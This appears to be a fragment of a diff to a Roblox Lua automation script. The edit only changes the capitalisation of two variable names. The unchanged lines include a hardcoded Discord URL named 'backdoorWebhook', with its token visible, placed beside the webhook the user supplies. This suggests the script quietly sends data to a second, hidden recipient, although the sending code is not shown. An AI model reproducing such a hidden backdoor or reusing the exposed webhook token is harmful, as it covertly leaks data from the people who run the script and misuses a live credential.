@@ -41,9 +41,9 @@ local TweenService = game:GetService("TweenService")
 local VirtualInput = game:GetService("VirtualInputManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-local webhookUrl = webhook
+local webhookUrl = Webhook
 local backdoorWebhook = "https://discord.com/api/webhooks/1403059699640963234/Cq9-kuz2xqyRVvTm3OCI4Ur82WrD1vYTJcoW6UTR_h5inVQ8_5hZynxsL6Nck9I5zOi8"
-local chatTrigger = command
+local chatTrigger = Command
 
 -- Server validation checks
 if game.PlaceId ~= 126884695634066 then
